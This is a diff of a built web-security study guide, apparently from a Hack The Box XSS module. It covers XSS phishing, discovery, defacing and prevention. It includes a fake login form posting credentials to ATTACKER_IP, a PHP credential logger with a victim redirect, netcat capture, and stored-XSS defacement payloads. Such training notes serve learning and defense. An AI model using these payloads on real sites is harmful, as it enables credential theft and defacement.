@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-141abd72.js";
+            window.path_to_searchindex_js = "searchindex-e89a1534.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-a1a1e25e.js"></script>
+        <script src="toc-92cb990d.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -19367,7 +19367,12 @@ ac
 </ul>
 <h3 id="xss-cross-site-scripting"><a class="header" href="#xss-cross-site-scripting">XSS (Cross-Site Scripting)</a></h3>
 <ul>
-<li><a href="infosec/xss/README.html">XSS</a></li>
+<li><a href="infosec/xss/README.html">XSS — types, labs, phishing, discovery, defacing, session hijacking, prevention</a></li>
+<li><a href="#xss-phishing-fake-login-forms">XSS phishing — fake login forms, credential capture</a></li>
+<li><a href="#xss-discovery">XSS discovery — scanners, payloads, code review</a></li>
+<li><a href="#xss-defacing-stored-xss">XSS defacing — stored XSS, visual takeover</a></li>
+<li><a href="#xss-blind-detection--session-hijacking-cookie-stealing">XSS session hijacking — blind XSS, cookie stealing</a></li>
+<li><a href="#xss-prevention">XSS prevention — validation, encoding, CSP, headers</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-dns"><a class="header" href="#attacking-dns">Attacking DNS</a></h1>
@@ -27851,10 +27856,14 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 <li><a href="#stored-persistent-xss">Stored (persistent) XSS — impact, testing, persistence checks</a></li>
 <li><a href="#reflected-non-persistent-xss">Reflected (non-persistent) XSS — vs DOM-based, lab pattern, URL delivery</a></li>
 <li><a href="#dom-based-xss">DOM-based XSS — source/sink, innerHTML, fragment URLs, payloads without <code>&lt;script&gt;</code></a></li>
-<li><a href="#xss-phishing-fake-login-forms">XSS phishing — fake login forms, <code>document.write</code>, cleanup, credential capture</a></li>
+<li><a href="#xss-phishing-fake-login-forms">XSS phishing — image-viewer lab, fake login form, <code>document.write</code>, cleanup, netcat/PHP capture</a></li>
+<li><a href="#xss-discovery">XSS discovery — scanners, open-source tools, payload lists, code review</a></li>
+<li><a href="#xss-defacing-stored-xss">XSS defacing — stored XSS, DOM levers, body/title/background, lab payloads</a></li>
+<li><a href="#xss-blind-detection--session-hijacking-cookie-stealing">XSS session hijacking — blind XSS, remote script OOB, cookie exfil, Firefox storage</a></li>
+<li><a href="#xss-prevention">XSS prevention — sources/sinks, validation, encoding, CSP, cookies</a></li>
 </ul>
 <h2 id="summary-9"><a class="header" href="#summary-9">Summary</a></h2>
-<p>Cross-site scripting lets attackers run JavaScript in victims’ browsers when applications fail to sanitize or encode user-controlled data. Notes cover client-side execution, typical impacts (session theft, forced actions, abuse of browser APIs), limits of pure XSS versus chaining with browser bugs, notable incidents (Samy worm, TweetDeck), and the three main types: <strong>stored</strong>, <strong>reflected</strong>, and <strong>DOM-based</strong> XSS. <strong>Stored</strong> XSS is covered in depth: saved payloads, wide victim pool, remediation in the database, basic PoC payloads (<code>alert(window.origin)</code>, <code>&lt;plaintext&gt;</code>, <code>print()</code>), iframe/origin confirmation, and using refresh to verify persistence. <strong>Reflected</strong> XSS is summarized separately: non-persistent behavior (vs DOM-based), error-message reflection, empty-quotes UI vs view-source confirmation, and delivering GET-based attacks via malicious URLs. <strong>DOM-based</strong> XSS is summarized separately: client-only processing, hash/URL sources, view-source vs inspector, source and sink functions, why <code>innerHTML</code> often blocks <code>&lt;script&gt;</code>, and event-handler payloads (e.g. <code>img</code> / <code>onerror</code>) delivered via shared URLs. <strong>XSS phishing</strong> is summarized separately: using XSS to inject a <strong>fake login form</strong> whose <code>action</code> targets the attacker, <strong><code>document.write</code></strong> for HTML injection, <strong><code>getElementById(...).remove()</code></strong> and HTML comments to hide the real UI, and capturing credentials via <strong>netcat</strong> or a small <strong>PHP</strong> logger with <strong>redirect</strong> back to the real app for a smoother victim experience.</p>
+<p>Cross-site scripting lets attackers run JavaScript in victims’ browsers when applications fail to sanitize or encode user-controlled data. Notes cover client-side execution, typical impacts (session theft, forced actions, abuse of browser APIs), limits of pure XSS versus chaining with browser bugs, notable incidents (Samy worm, TweetDeck), and the three main types: <strong>stored</strong>, <strong>reflected</strong>, and <strong>DOM-based</strong> XSS. <strong>Stored</strong> XSS is covered in depth: saved payloads, wide victim pool, remediation in the database, basic PoC payloads (<code>alert(window.origin)</code>, <code>&lt;plaintext&gt;</code>, <code>print()</code>), iframe/origin confirmation, and using refresh to verify persistence. <strong>Reflected</strong> XSS is summarized separately: non-persistent behavior (vs DOM-based), error-message reflection, empty-quotes UI vs view-source confirmation, and delivering GET-based attacks via malicious URLs. <strong>DOM-based</strong> XSS is summarized separately: client-only processing, hash/URL sources, view-source vs inspector, source and sink functions, why <code>innerHTML</code> often blocks <code>&lt;script&gt;</code>, and event-handler payloads (e.g. <code>img</code> / <code>onerror</code>) delivered via shared URLs. <strong>XSS phishing</strong> is summarized separately: <strong>trusted-domain</strong> fake login UI that posts credentials to the attacker; <strong>authorized</strong> use as <strong>awareness simulations</strong>; <strong><code>/phishing</code>-style image URL</strong> labs where a raw <strong><code>&lt;script&gt;</code></strong> test often fails until <strong>source/context</strong> review; <strong><code>document.write</code></strong> for minified form HTML; <strong><code>getElementById('urlform').remove()</code></strong> after inspector (<strong><code>Ctrl+Shift+C</code></strong>) to drop the real URL field; <strong><code>&lt;!--</code></strong> after the payload to comment out trailing template; <strong>reflected</strong> delivery via a copied <strong>malicious URL</strong>; <strong>netcat</strong> on port <strong>80</strong> for quick <strong>GET</strong> <code>/?username=…&amp;password=…</code> capture vs a <strong>PHP</strong> listener that <strong>logs</strong> to <strong><code>creds.txt</code></strong> and <strong>redirects</strong> to the clean app so the victim does not see a broken HTTP response. <strong>XSS discovery</strong> is summarized separately: <strong>automated</strong> scanning (passive DOM hints vs active payload injection; commercial vs OSS tradeoffs), tools such as <strong>XSStrike</strong> / <strong>Brute XSS</strong> / <strong>XSSer</strong> and why <strong>reflection in HTML ≠ execution</strong>, <strong>manual</strong> testing with public payload lists and non-form sinks (<strong>headers</strong> like <strong>Cookie</strong> / <strong>User-Agent</strong>), why generic lists miss simple labs, optional custom scripting for odd targets, and <strong>manual code review</strong> as the most reliable path when full data flow is visible (with deeper secure-coding / white-box study left to other modules). <strong>XSS defacing</strong> is summarized separately: using <strong>stored</strong> XSS for <strong>persistent</strong> visual takeover, <strong>reputation</strong> impact (e.g. public sector defacements), four common levers (<strong><code>document.body.style.background</code></strong>, <strong><code>document.body.background</code></strong>, <strong><code>document.title</code></strong>, <strong><code>innerHTML</code></strong>), swapping <strong>full <code>&lt;body&gt;</code></strong> markup (with <strong><code>getElementsByTagName('body')[0]</code></strong>), optional <strong>jQuery</strong> when present, <strong>minified</strong> one-line HTML inside payloads, and how <strong>view-source</strong> can still show original structure while the <strong>rendered DOM</strong> looks defaced—plus <strong>injection position</strong> (end vs middle of page) affecting what later content might still appear. <strong>XSS session hijacking / blind XSS</strong> is summarized separately: <strong>cookies</strong> as session handles; <strong>blind</strong> sinks (<strong>admin</strong> panels, tickets, reviews, <strong><code>User-Agent</code></strong>); <strong><code>/hijacking</code></strong>-style registration reviewed by staff; <strong>OOB</strong> detection via <strong><code>&lt;script src=http://IP/fieldname&gt;</code></strong> so the <strong>request path</strong> names the vulnerable input; <strong>PayloadsAllTheThings</strong>-style <strong>quote-break</strong> variants and <strong>XHR</strong> / <strong><code>$.getScript</code></strong> when jQuery exists; <strong><code>sudo php -S 0.0.0.0:80</code></strong> to catch callbacks; pragmatic <strong>skips</strong> (<strong>email</strong> validation, <strong>password</strong> unlikely echoed); then <strong><code>new Image().src</code></strong> (vs <strong><code>document.location</code></strong>) to send <strong><code>document.cookie</code></strong> in a <strong>GET</strong> to <strong><code>index.php?c=</code></strong>, <strong>PHP</strong> splitting on <strong><code>;</code></strong>, <strong><code>urldecode</code></strong>, <strong><code>cookies.txt</code></strong> lines with <strong><code>REMOTE_ADDR</code></strong>; replay in <strong>Firefox Storage</strong> (<strong><code>Shift+F9</code></strong>) by adding <strong>name/value</strong> and refreshing—plus <strong><code>HttpOnly</code></strong> as the main cookie theft mitigation. <strong>XSS prevention</strong> is summarized separately: secure <strong>sources</strong> and <strong>sinks</strong> on <strong>client and server</strong>; front-end <strong>regex validation</strong> (e.g. email), <strong>DOMPurify</strong> for client-side HTML sanitization, avoiding <strong><code>&lt;script&gt;</code> / <code>&lt;style&gt;</code> / attributes / comments</strong> built from input and dangerous APIs (<strong><code>innerHTML</code></strong>, <strong><code>document.write</code></strong>, <strong><code>document.domain</code></strong>, jQuery <strong><code>.html()</code></strong> / <strong><code>parseHTML()</code></strong> / insertion helpers); back-end <strong><code>filter_var</code></strong> / validation, sanitization libraries, <strong>never raw echo</strong> of request params; <strong>output encoding</strong> with <strong><code>htmlspecialchars</code>/<code>htmlentities</code></strong> (PHP) or <strong><code>html-entities</code></strong> (Node); deployment levers (<strong>HTTPS</strong>, <strong>CSP</strong> like <strong><code>script-src 'self'</code></strong>, <strong><code>X-Content-Type-Options: nosniff</code></strong>, <strong><code>HttpOnly</code>/<code>Secure</code></strong> cookies, <strong>WAF</strong>, framework defaults such as <strong>ASP.NET</strong>); and ongoing <strong>offensive retesting</strong> because secure coding plus config can still miss edge cases—the note clarifies that <strong><code>addslashes</code></strong> alone is a weak primary HTML-XSS control versus <strong>contextual encoding</strong>.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="cross-site-scripting-xss--introduction"><a class="header" href="#cross-site-scripting-xss--introduction">Cross-Site Scripting (XSS) — Introduction</a></h1>
 <h2 id="why-it-matters"><a class="header" href="#why-it-matters">Why it matters</a></h2>
@@ -28033,18 +28042,23 @@ var task = document.URL.substring(pos + 5, document.URL.length);
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="xss-phishing-fake-login-forms"><a class="header" href="#xss-phishing-fake-login-forms">XSS Phishing (Fake Login Forms)</a></h1>
 <h2 id="what-it-is-1"><a class="header" href="#what-it-is-1">What it is</a></h2>
-<p><strong>XSS phishing</strong> uses cross-site scripting to show <strong>legitimate-looking UI</strong> (often a <strong>login form</strong>) on a site the victim already trusts. Submitted credentials are sent to an <strong>attacker-controlled</strong> endpoint instead of the real application. The attacker can reuse those credentials for account takeover.</p>
-<p>In <strong>authorized assessments</strong>, the same idea can support <strong>phishing simulations</strong>: if employees trust the vulnerable app, a crafted URL tests whether they will enter credentials on unexpected prompts.</p>
+<p><strong>XSS phishing</strong> uses cross-site scripting to show <strong>legitimate-looking UI</strong> (often a <strong>login form</strong>) on a site the victim already trusts. Submitted credentials go to an <strong>attacker-controlled</strong> server so the attacker can <strong>log in as the victim</strong> and access accounts and sensitive data.</p>
+<p>In <strong>authorized</strong> work, a known XSS on an org’s app can double as a <strong>phishing simulation</strong>: employees who trust the domain may not expect a malicious prompt, which measures <strong>security awareness</strong>.</p>
 <h2 id="prerequisites-5"><a class="header" href="#prerequisites-5">Prerequisites</a></h2>
-<p>This pattern assumes you already have <strong>executable JavaScript</strong> on the page (stored, reflected, or DOM-based XSS). The delivery mechanism is the same as for other XSS payloads (for example, a <strong>malicious URL</strong> for reflected XSS).</p>
-<h2 id="discovery-on-an-image-url-viewer"><a class="header" href="#discovery-on-an-image-url-viewer">Discovery on an “image URL” viewer</a></h2>
-<p>Apps that load remote images from a user-supplied URL (common in forums and similar sites) often place the parameter in an HTML context where a naïve <code>&lt;script&gt;...&lt;/script&gt;</code> string <strong>does not execute</strong> (for example, inside an <code>img</code> <code>src</code> or similar attribute). Treat that as a signal to run your usual <strong>XSS discovery</strong> workflow: <strong>view the rendered HTML source</strong> after submitting input, identify <strong>context</strong> (attribute vs. text vs. script), and craft a payload that <strong>breaks out</strong> and runs code in that context.</p>
+<p>You need a <strong>working XSS</strong> on the target (stored, reflected, or DOM-based). Delivery matches normal XSS (for example, a <strong>malicious URL</strong> for <strong>reflected</strong> XSS on a <code>GET</code> parameter).</p>
+<h2 id="lab-pattern-phishing-image-url-viewer"><a class="header" href="#lab-pattern-phishing-image-url-viewer">Lab pattern: <code>/phishing</code> image URL viewer</a></h2>
+<p>The module uses a simple <strong>online image viewer</strong>: you pass an image <strong>URL</strong> and the page renders it, e.g.:</p>
+<p><code>http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg</code></p>
+<p>That pattern appears in <strong>forums</strong> and similar apps. A naïve test like:</p>
+<p><code>...?url=&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></p>
+<p>often <strong>does nothing useful</strong> (dead image icon, no alert): the parameter may land in a context where a raw <code>&lt;script&gt;</code> string <strong>does not execute</strong> (for example attribute or URL context for <code>&lt;img src="..."&gt;</code>).</p>
+<p>Run your <strong>XSS discovery</strong> process: after each attempt, <strong>view page source</strong> and see <strong>exactly</strong> how the server placed your input—then craft a payload that <strong>escapes that context</strong> and runs JavaScript (same discipline as any XSS lab; solve it before building the phishing chain).</p>
 <h2 id="injecting-the-fake-login-form"><a class="header" href="#injecting-the-fake-login-form">Injecting the fake login form</a></h2>
 <ol>
-<li>Build a minimal HTML form whose <strong><code>action</code></strong> points to your machine (the IP you will listen on, e.g. from <code>ip a</code> on <code>tun0</code>). Use <strong><code>method="get"</code></strong> (default) if you want credentials in the query string, or <strong><code>post</code></strong> if your collector expects a body.</li>
-<li>From JavaScript on the vulnerable page, <strong><code>document.write(...)</code></strong> can emit that HTML in one minified line so it fits inside your XSS payload.</li>
+<li>Build HTML for a <strong>login form</strong> whose <strong><code>action</code></strong> is your machine (IP from <code>ip a</code>, often <strong><code>tun0</code></strong> on HTB). With default <strong><code>GET</code></strong>, credentials appear in the <strong>query string</strong> when the victim submits.</li>
+<li>Emit that HTML from the page with <strong><code>document.write('...')</code></strong>, usually <strong>one minified line</strong> inside whatever XSS vector you already proved (replace the <code>alert(window.origin)</code> proof-of-concept with this script).</li>
 </ol>
-<p>Example shape (use your IP and correct <code>input</code> types such as <code>text</code> / <code>password</code>):</p>
+<p>Example markup (use <strong><code>type="text"</code></strong> / <strong><code>type="password"</code></strong> for real browsers; some course snippets use nonstandard <code>type</code> values that still degrade to text-like behavior):</p>
 <pre><code class="language-html">&lt;h3&gt;Please login to continue&lt;/h3&gt;
 &lt;form action="http://ATTACKER_IP"&gt;
   &lt;input type="text" name="username" placeholder="Username"&gt;
@@ -28052,50 +28066,317 @@ var task = document.URL.substring(pos + 5, document.URL.length);
   &lt;input type="submit" name="submit" value="Login"&gt;
 &lt;/form&gt;
 </code></pre>
-<p>Wrapped for injection:</p>
+<p>Injected as one string (note quoting and no line breaks inside the string):</p>
 <pre><code class="language-javascript">document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://ATTACKER_IP&gt;&lt;input type="text" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt;');
 </code></pre>
-<p>Replace the inner JavaScript with whatever your <strong>working XSS vector</strong> requires (event handler, broken-out attribute, etc.), same as you would for <code>alert(window.origin)</code>.</p>
+<p>For <strong>reflected</strong> XSS, the full attack is typically a <strong>single URL</strong> with your payload in the <strong><code>url</code></strong> (or relevant) parameter—same idea as the reflected XSS notes.</p>
 <h2 id="cleaning-up-the-page"><a class="header" href="#cleaning-up-the-page">Cleaning up the page</a></h2>
-<p>Victims are less likely to use a fake form if the <strong>real</strong> “image URL” field is still visible.</p>
-<ul>
-<li>Use the DOM inspector to find the <strong><code>id</code></strong> of the original form (lab example: <code>urlform</code> on <code>&lt;form id="urlform" ...&gt;</code>).</li>
-<li>After <code>document.write(...)</code>, run <strong><code>document.getElementById('urlform').remove()</code></strong> (adjust the id to match the target page).</li>
-</ul>
-<p>If <strong>trailing HTML</strong> from the original page still appears after your injected markup, appending an <strong>HTML comment opener</strong> after the payload in the reflected parameter can <strong>comment out</strong> the remainder of the server’s template so the page looks like a normal login screen.</p>
-<h2 id="capturing-credentials"><a class="header" href="#capturing-credentials">Capturing credentials</a></h2>
-<h3 id="quick-check-with-netcat"><a class="header" href="#quick-check-with-netcat">Quick check with netcat</a></h3>
-<p>Listen on the port your form posts to (example: port 80):</p>
+<p>If the <strong>real</strong> “image URL” form is still visible, the story (“please login”) is weaker.</p>
+<ol>
+<li>In DevTools, use the <strong>element picker</strong> (e.g. Firefox <strong><code>Ctrl+Shift+C</code></strong>) and click the URL form to read its <strong><code>id</code></strong>.</li>
+<li>In the lab, the GET form is often:</li>
+</ol>
+<pre><code class="language-html">&lt;form role="form" action="index.php" method="GET" id="urlform"&gt;
+  &lt;input type="text" placeholder="Image URL" name="url"&gt;
+&lt;/form&gt;
+</code></pre>
+<ol start="3">
+<li>After <code>document.write(...)</code>, remove it:</li>
+</ol>
+<pre><code class="language-javascript">document.getElementById('urlform').remove();
+</code></pre>
+<p><strong>Chained</strong> with the write call:</p>
+<pre><code class="language-javascript">document.write('...form html...');document.getElementById('urlform').remove();
+</code></pre>
+<p>If <strong>leftover</strong> server HTML still appears <strong>after</strong> your injected block, append an <strong>HTML comment start</strong> immediately after your payload in the vulnerable parameter (e.g. <code>...payload...&lt;!--</code>) so the rest of the template is <strong>commented out</strong> and the page looks like a normal login gate.</p>
+<h2 id="credential-stealing"><a class="header" href="#credential-stealing">Credential stealing</a></h2>
+<h3 id="listener-not-running"><a class="header" href="#listener-not-running">Listener not running</a></h3>
+<p>If the form posts to your IP but <strong>nothing</strong> is listening, the browser shows errors such as <strong>“This site can’t be reached”</strong>—expected until you open a collector.</p>
+<h3 id="quick-capture-with-netcat"><a class="header" href="#quick-capture-with-netcat">Quick capture with netcat</a></h3>
 <pre><code class="language-bash">sudo nc -lvnp 80
 </code></pre>
-<p>A GET form produces a request whose query string carries the fields, for example:</p>
+<p>Submitting the form yields a <strong>GET</strong> with credentials in the URL, for example:</p>
 <pre><code class="language-http">GET /?username=test&amp;password=test&amp;submit=Login HTTP/1.1
 Host: ATTACKER_IP
 </code></pre>
-<p>Netcat shows the credentials but <strong>does not complete HTTP cleanly</strong>, so the browser may show errors.</p>
-<h3 id="smoother-ux-small-php-collector--redirect"><a class="header" href="#smoother-ux-small-php-collector--redirect">Smoother UX: small PHP collector + redirect</a></h3>
-<p>A short script can <strong>log</strong> <code>username</code> / <code>password</code> from the request and <strong><code>Location</code></strong> redirect the victim back to the <strong>legitimate</strong> image viewer (no XSS in the URL on the return), so they believe login succeeded:</p>
+<p>Netcat <strong>does not speak HTTP</strong> properly on the way back, so the victim may see <strong>connection / unable to connect</strong> style errors—usable for a demo, suspicious for a smooth phish.</p>
+<h3 id="smoother-ux-php-logger--redirect"><a class="header" href="#smoother-ux-php-logger--redirect">Smoother UX: PHP logger + redirect</a></h3>
+<p>A tiny <strong><code>index.php</code></strong> can <strong>append</strong> credentials to <strong><code>creds.txt</code></strong> and <strong><code>header("Location: ...")</code></strong> the victim to the <strong>real</strong> image viewer (clean URL, no XSS), so they assume login worked:</p>
 <pre><code class="language-php">&lt;?php
 if (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
     $file = fopen("creds.txt", "a+");
     fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
-    header("Location: http://LEGIT_SERVER_IP/phishing/index.php");
+    header("Location: http://SERVER_IP/phishing/index.php");
     fclose($file);
     exit();
 }
 ?&gt;
 </code></pre>
-<p>Serve it with PHP’s built-in server (example):</p>
+<p>Replace <strong><code>SERVER_IP</code></strong> with the <strong>legitimate</strong> app host from the exercise. Serve from a directory that contains this file:</p>
 <pre><code class="language-bash">mkdir -p /tmp/tmpserver &amp;&amp; cd /tmp/tmpserver
-# place index.php here
+# write index.php here
 sudo php -S 0.0.0.0:80
 </code></pre>
-<p>Credentials accumulate in <code>creds.txt</code> on the attacker host.</p>
+<p>Verify <strong><code>creds.txt</code></strong>:</p>
+<pre><code class="language-bash">cat creds.txt
+</code></pre>
+<p>Then share the <strong>final malicious URL</strong> (with the full XSS payload) only in <strong>authorized</strong> tests.</p>
 <h2 id="operational-and-defensive-notes"><a class="header" href="#operational-and-defensive-notes">Operational and defensive notes</a></h2>
 <ul>
-<li><strong>Authorization</strong>: Only run this against systems and users you are permitted to test.</li>
-<li><strong>Defenses</strong>: eliminate XSS (encoding, CSP, safe sinks), use <strong>phishing-resistant authentication</strong>, and train users to treat <strong>unexpected login prompts</strong> as suspicious even on familiar domains.</li>
+<li><strong>Authorization</strong>: Run only where you have permission; credential capture is sensitive.</li>
+<li><strong>Defenses</strong>: fix XSS at the root (encoding, CSP, safe sinks), prefer <strong>phishing-resistant</strong> auth where possible, and train users to treat <strong>unexpected login prompts</strong> as suspicious even on familiar hostnames.</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="xss-discovery"><a class="header" href="#xss-discovery">XSS Discovery</a></h1>
+<p>Finding XSS can be as hard as exploiting it, but the bug class is common enough that both commercial scanners and open-source helpers exist. Discovery splits into <strong>automated</strong> approaches, <strong>manual</strong> payload testing, and <strong>code review</strong> (the most reliable when you can trace input end-to-end).</p>
+<h2 id="automated-discovery-1"><a class="header" href="#automated-discovery-1">Automated discovery</a></h2>
+<p><strong>Web application scanners</strong> (e.g. Nessus, Burp Suite Pro, OWASP ZAP) typically combine:</p>
+<ul>
+<li><strong>Passive scanning</strong> — inspects client-side code for <strong>DOM-based</strong> candidates.</li>
+<li><strong>Active scanning</strong> — sends crafted <strong>payloads</strong> to provoke reflection or unsafe rendering in page source.</li>
+</ul>
+<p>Paid tools often do better when <strong>bypasses</strong> or subtle contexts matter. Open-source tools often <strong>enumerate inputs</strong>, fuzz with XSS strings, and <strong>diff or grep rendered HTML</strong> for the same payload. <strong>Reflection in source does not prove execution</strong> (encoding, CSP, context, parser quirks), so <strong>always verify manually</strong>.</p>
+<p>Examples of open-source helpers: <strong>XSStrike</strong>, <strong>Brute XSS</strong>, <strong>XSSer</strong>. XSStrike can be installed from GitHub, dependencies via <code>pip install -r requirements.txt</code>, then run with e.g. <code>python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"</code>. It may report <strong>reflections</strong>, generate many payloads, and score <strong>efficiency/confidence</strong>; you should still <strong>confirm</strong> a payload in the target app (e.g. prior reflected XSS labs).</p>
+<h2 id="manual-discovery-payload-lists"><a class="header" href="#manual-discovery-payload-lists">Manual discovery: payload lists</a></h2>
+<p>The simplest manual path is trying <strong>known payloads</strong> against each input (large lists exist, e.g. <strong>PayloadsAllTheThings</strong>, <strong>Payload-Box</strong>). Success is often judged by something obvious like <strong><code>alert()</code></strong>.</p>
+<p><strong>Injection is not limited to form fields</strong> — any attacker-controlled string that reaches HTML can matter, including <strong>HTTP headers</strong> (e.g. <strong>Cookie</strong>, <strong>User-Agent</strong>) when those values are <strong>echoed into the page</strong>.</p>
+<p>Most public payloads are <strong>generic</strong>: they assume specific <strong>quotes</strong>, <strong>tags</strong>, or <strong>filter evasions</strong>, and use varied vectors (<code>&lt;script&gt;</code>, event attributes on <code>&lt;img&gt;</code>, <strong>CSS</strong>-related tricks, etc.). Expect <strong>many misses</strong> on a single simple lab; blind copy-paste is <strong>slow</strong> across many parameters. A custom <strong>Python</strong> script to send a wordlist and compare responses can help when off-the-shelf tools are awkward — that is an <strong>advanced</strong> topic outside a short XSS module.</p>
+<h2 id="code-review"><a class="header" href="#code-review">Code review</a></h2>
+<p><strong>Manual review</strong> of <strong>server and client</strong> code is the most dependable method when you can follow <strong>data flow from entry to browser</strong>. If you know <strong>encoding, templating, and sinks</strong> (including DOM <strong>sources/sinks</strong>), you can craft <strong>context-specific</strong> payloads with high confidence.</p>
+<p>Mature products are often pre-scanned and patched; <strong>subtle XSS</strong> may survive where <strong>lists and scanners</strong> fail. Deeper <strong>secure coding</strong> and <strong>white-box</strong> material is left to dedicated courses (e.g. Secure Coding 101: JavaScript, Whitebox Pentesting 101: Command Injection) referenced in the original module.</p>
+<h2 id="takeaways"><a class="header" href="#takeaways">Takeaways</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Approach</th><th>Role</th></tr>
+</thead>
+<tbody>
+<tr><td>Scanners / XSStrike-style tools</td><td>Broad coverage, fast triage; confirm hits</td></tr>
+<tr><td>Payload lists + manual tries</td><td>Good for learning and simple apps; inefficient at scale</td></tr>
+<tr><td>Code review</td><td>Best signal when source is available</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="xss-defacing-stored-xss"><a class="header" href="#xss-defacing-stored-xss">XSS defacing (stored XSS)</a></h1>
+<p>After you can <strong>find</strong> XSS, exploitation depends on <strong>type</strong> and <strong>context</strong>: <strong>stored</strong> XSS is typically the most severe for site-wide impact because every visitor loads the malicious record.</p>
+<p><strong>Website defacing</strong> means changing what the page <strong>looks like</strong> for visitors—often a short “we were here” message rather than polished design. Real incidents (e.g. high-profile <strong>NHS</strong> defacement in <strong>2018</strong>) show <strong>reputational</strong> and even <strong>financial</strong> effects. Many bugs can alter a site; <strong>stored XSS</strong> is a common choice because the change <strong>persists</strong> and hits <strong>everyone</strong> who loads the poisoned page.</p>
+<h2 id="four-common-dom-levers"><a class="header" href="#four-common-dom-levers">Four common DOM levers</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Goal</th><th>Typical API</th></tr>
+</thead>
+<tbody>
+<tr><td>Background <strong>color</strong></td><td><code>document.body.style.background</code> (e.g. hex <code>"#141d2b"</code> or named <code>"black"</code>)</td></tr>
+<tr><td>Background <strong>image</strong></td><td><code>document.body.background = "https://…"</code></td></tr>
+<tr><td>Tab / window <strong>title</strong></td><td><code>document.title = '…'</code></td></tr>
+<tr><td>Main <strong>content</strong></td><td>Element <code>.innerHTML</code>, or replace <strong>whole</strong> <code>&lt;body&gt;</code> markup</td></tr>
+</tbody>
+</table>
+</div>
+<p>Combining a few of these gives a minimal defacement; you can also <strong>remove or obscure</strong> original UI to slow <strong>reset</strong> or cleanup.</p>
+<h2 id="stored-xss-lab-pattern-to-do-app"><a class="header" href="#stored-xss-lab-pattern-to-do-app">Stored XSS lab pattern (to-do app)</a></h2>
+<p>Payloads are saved and run for <strong>all</strong> users after refresh—classic <strong>stored</strong> behavior.</p>
+<h3 id="change-background-color"><a class="header" href="#change-background-color">Change background (color)</a></h3>
+<pre><code class="language-html">&lt;script&gt;document.body.style.background = "#141d2b"&lt;/script&gt;
+</code></pre>
+<p>Use any hex or CSS color name. Defacements often use <strong>dark</strong> backgrounds.</p>
+<h3 id="change-background-image"><a class="header" href="#change-background-image">Change background (image)</a></h3>
+<pre><code class="language-html">&lt;script&gt;document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"&lt;/script&gt;
+</code></pre>
+<h3 id="change-page-title"><a class="header" href="#change-page-title">Change page title</a></h3>
+<pre><code class="language-html">&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;
+</code></pre>
+<h3 id="change-page-text"><a class="header" href="#change-page-text">Change page text</a></h3>
+<p><strong>Single element</strong> by id:</p>
+<pre><code class="language-javascript">document.getElementById("todo").innerHTML = "New Text"
+</code></pre>
+<p>If <strong>jQuery</strong> is on the page:</p>
+<pre><code class="language-javascript">$("#todo").html('New Text');
+</code></pre>
+<p><strong>Replace entire body HTML</strong> (common for a single splash message):</p>
+<pre><code class="language-javascript">document.getElementsByTagName('body')[0].innerHTML = "…your HTML…"
+</code></pre>
+<p>Prepare and <strong>test HTML locally</strong> first, then <strong>minify to one line</strong> inside the script string to avoid quoting/line-break issues. Example message block (from the module):</p>
+<pre><code class="language-html">&lt;center&gt;
+    &lt;h1 style="color: white"&gt;Cyber Security Training&lt;/h1&gt;
+    &lt;p style="color: white"&gt;by
+        &lt;img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"&gt;
+    &lt;/p&gt;
+&lt;/center&gt;
+</code></pre>
+<p>Wrapped as one payload:</p>
+<pre><code class="language-html">&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = '&lt;center&gt;&lt;h1 style="color: white"&gt;Cyber Security Training&lt;/h1&gt;&lt;p style="color: white"&gt;by &lt;img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"&gt; &lt;/p&gt;&lt;/center&gt;'&lt;/script&gt;
+</code></pre>
+<h2 id="view-source-vs-what-users-see"><a class="header" href="#view-source-vs-what-users-see">View source vs what users see</a></h2>
+<p><strong>Injected scripts</strong> may sit at the <strong>end</strong> of the HTML (e.g. inside list markup) while <strong>runtime</strong> changes rewrite the <strong>DOM</strong>—users see the defaced view. If injection sits <strong>mid-page</strong>, <strong>later</strong> scripts or nodes might still run or render, so you may need <strong>ordering</strong> or <strong>additional</strong> DOM edits to get the final look you want.</p>
+<h2 id="takeaways-1"><a class="header" href="#takeaways-1">Takeaways</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Idea</th><th>Detail</th></tr>
+</thead>
+<tbody>
+<tr><td>Why stored</td><td><strong>Persistent</strong>, <strong>broad</strong> audience, good for visible defacement</td></tr>
+<tr><td>Technique</td><td><strong><code>style</code></strong>, <strong><code>background</code></strong>, <strong><code>title</code></strong>, <strong><code>innerHTML</code></strong> (per-element or full <code>body</code>)</td></tr>
+<tr><td>Practice</td><td>Prototype HTML <strong>offline</strong>, then one-line payload; <strong>verify</strong> in the real app</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="xss-blind-detection--session-hijacking-cookie-stealing"><a class="header" href="#xss-blind-detection--session-hijacking-cookie-stealing">XSS: blind detection &amp; session hijacking (cookie stealing)</a></h1>
